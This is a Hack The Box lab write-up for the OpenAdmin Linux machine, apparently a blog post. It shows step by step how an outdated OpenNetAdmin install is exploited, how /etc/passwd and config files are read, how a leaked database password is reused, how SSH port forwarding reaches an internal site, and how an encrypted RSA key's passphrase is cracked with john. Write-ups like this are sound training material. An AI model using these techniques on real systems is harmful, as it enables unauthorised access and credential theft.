---
layout: single
title: "OpenAdmin - Linux HacktheBox Writeup"
categories:
  - Writeup
tags:
  - Linux
  - HackTheBox
  - Easy
classes:
  - wide
---

>"*OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a root shell.*"

 *Hack The Box* - OpenAdmin Synopsis


**ENUMERATION**

Nmap results:
```
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The scan reveals the existence of two ports of interest. One running SSH(22) and one running Apache(80). 

Seeing as there is a HTTP address, we can enumerate the directories using gobuster and/or dirbuster. 

The first directories scanned are the following:
```
/icons
/music
/ona
/artwork
```
What immediately jumps out is the directory 'ona'. When visiting this page (10.10.10.171/ona) we quickly find out ONA stood for OpenNetAdmin. 
[OpenNetAdmin](https://opennetadmin.com/about.html) is *"a system for tracking IP network attributes in a database. A web interface is provided to administer the data"*. 

There is a warning on the web page. Warning the user that the latest version has not been updated. We are still running an older version: 18.1.1


**FOOTHOLD/EXPLOITATION**

We can immediately look for an exploit using this information.Using [exploitDB](https://www.exploit-db.com/) and searchsploit, we see a few results to do with the same version. 

Let's try out this [exploit](https://www.exploit-db.com/exploits/47691). We can download and run it in our terminal.
```
47691.sh: 23: Syntax error: "done" unexpected (expecting "do")
```  
Hmm. 

*For this writeup, I ended up using a [python version of this script](https://github.com/amriunix/ona-rce).
However, I did go back a little later, to figure out and get my head around the initial error.
Looking around on my browser, I found [this thread](https://unix.stackexchange.com/questions/440197/bash-for-loop-not-working) discussing a similar issue.
According to one of the users, the script file was likely a DOS text file, creating a reading confusion for bash because of the return **\r**. Using the tool **dos2unix** would have successfully converted the file to a Unix text file.* 

Back to the writeup.
Running the python script, we quickly get a shell as www-data. Also a good time to upgrade our shell, making sure we have a full TTY stable shell.
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ /usr/bin/script -qc /bin/bash /dev/null
www-data@openadmin:/opt/ona/www$
``` 
The first command we should always run, is checking if there are any readable files of interest. 
Files such as:
/etc/passwd
/etc/shadow
/etc/crontab

```
www-data@openadmin:/opt/ona/www$ cat /etc/passwd
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash

```
We see two other system users: Jimmy and Joanna. 

```
ww-data@openadmin:/home$ cd /home/jimmy
cd /home/jimmy
bash: cd: /home/jimmy: Permission denied

www-data@openadmin:/home$ cd /home/joanna
cd /home/joanna
bash: cd: /home/joanna: Permission denied
```
Unfortunately, we do not permission to access these home directories. So it looks like we are going to have to perform some lateral movement. 


**LATERAL MOVEMENT**

The first idea that pops up when exploiting a box that has any sort of web service. Is to find the config files.
So going back to **/var/www**, we begin exploring the ona directory.

Reading the *config.inc.php* file in the **/config** directory we get:
```
www-data@openadmin:/var/www/ona/config$ cat config.inc.php
cat config.inc.php
<?php

///////////////////////   WARNING   /////////////////////////////
//           This is the site configuration file.              //
//                                                             //
//      It is not intended that this file be edited.  Any      //
//      user configurations should be in the local config or   //
//      in the database table sys_config                       //
//                                                             //
/////////////////////////////////////////////////////////////////

```  
Reading the warning banner, we immediately learn that any user configurations would be in the local config. We should check it out to find potential credentials. 

```
www-data@openadmin:/var/www/ona/local/config$ cat database_settings.inc.php
cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
We find some very interesting information when reading the file. 
Hopefully we can try to reuse this password to move laterally to one of the other users. Let's try jimmy first. 

```
www-data@openadmin:/var/www/ona/local/config$ su jimmy
su jimmy
Password: n1nj4W4rri0R!

jimmy@openadmin:/opt/ona/www/local/config$ id
id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```
Success!
Unfortunately, when looking around his directory, nothing of interest was there, no user flag either. And we still cannot access joanna's directory. This must mean we did to move laterally again.

We can check to see what groups is joanna a part of:
```
jimmy@openadmin:~$ groups jimmy
groups jimmy
jimmy : jimmy internal

jimmy@openadmin:~$ groups joanna
groups joanna
joanna : joanna internal
``` 
So they both are a part of the internal group.

Okay well first things first, let's have a look at things we could not access before. 
We can now have a look at /var/www/internal. This is the group they are both a part of.
Reading the index.php file, we see:

```
</head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
``` 
A crackable hash!

Knowing the type and having the hash, we find out the hash is cracked to produce the following password: **Revealed**

Having read the index.php and main.php file, I realise that this actually meant that jimmy is hosting a website. We just need to find out how it is hosted. 
Knowing the file system hierarchy, we should check out **/etc** as this is where we can find the host-specific system configuration. 

After a bit of searching, we find in **/etc/apache2/sites-available**: 
```
jimmy@openadmin:/etc/apache2/sites-available$ ls
ls
default-ssl.conf  internal.conf  openadmin.conf

```  
Inside internal.conf:
```
jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf
cat internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```
We see the internal virtual host is running as joanna on localhost port 52846. 

What we need to do now is port forwarding through SSH.

>"*Local forwarding is used to forward a port from the client machine to the server machine. Basically, the SSH client listens for connections on a configured port, and when it receives a connection, it tunnels the connection to an SSH server. The server connects to a configurated destination port, possibly on a different machine than the SSH server.*" 

```
ssh jimmy@10.10.10.171 -L 52846:localhost:52846
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep 24 15:52:57 UTC 2021

  System load:  0.0               Processes:             196
  Usage of /:   54.7% of 7.81GB   Users logged in:       0
  Memory usage: 39%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$

```
We should be able to access the website now through our browser at **http://127.0.0.1:52846/**. 
We can try to login using the credentials we found earlier: (jimmy:Revealed). 
Here's the output:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----

Don't forget your "ninja" password
Click here to logout Session 
```
We have an RSA key! 

We can decrypt it by using john, after generating a hash using ssh2john.py:
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh id_rsa_jo  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (/home/user/keyjo)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2021-09-24 16:49) 0.2695g/s 3865Kp/s 3865Kc/s 3865KC/sa6_123..*7¡Vamos!
Session completed

```
We can finally SSH with the key and the passphrase. 

```
ssh -i /home/user/keyjo joanna@10.10.10.171
load pubkey "/home/user/keyjo": invalid format
Enter passphrase for key '/home/user/keyjo': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep 24 16:08:29 UTC 2021

  System load:  0.0               Processes:             201
  Usage of /:   54.8% of 7.81GB   Users logged in:       1
  Memory usage: 39%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ ls
user.txt

```
One flag down, another to go.

**PRIVILEGE ESCALATION**

Doing the usual check, sudo -l tells us that joanna has nano permissions. So we can check out [GTFObins](https://gtfobins.github.io/gtfobins/nano/) to see what to do in the case of nano. 

Following the instructions, we very easily get a root shell, and with that, the final flag!